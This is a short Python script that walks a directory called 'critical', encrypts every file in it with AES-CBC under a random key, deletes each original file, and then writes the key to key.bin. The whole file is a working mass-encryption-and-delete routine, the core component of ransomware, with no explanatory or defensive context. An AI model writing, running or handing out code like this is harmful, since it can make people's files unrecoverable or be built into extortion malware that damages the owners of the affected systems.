from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os

def pad(data):
    return data + b"\0" * (AES.block_size - len(data) % AES.block_size)

def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
    if not out_filename:
        out_filename = in_filename + '.enc'

    iv = get_random_bytes(AES.block_size)
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(filesize.to_bytes(8, 'big'))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % AES.block_size != 0:
                    chunk = pad(chunk)

                outfile.write(encryptor.encrypt(chunk))
   
    os.remove(in_filename)  # Delete the original file after encryption

def encrypt_directory(key, path):
    for root, dirs, files in os.walk(path):
        for file in files:
            full_file_path = os.path.join(root, file)
            if not full_file_path.endswith('.enc'):  # Check to avoid double encryption
                encrypt_file(key, full_file_path)

key = get_random_bytes(16)  # AES key must be either 16, 24, or 32 bytes long
directory_path = "critical"  # Directory to encrypt

encrypt_directory(key, directory_path)

with open("key.bin", "wb") as key_file:  # Save the key to a file
    key_file.write(key)


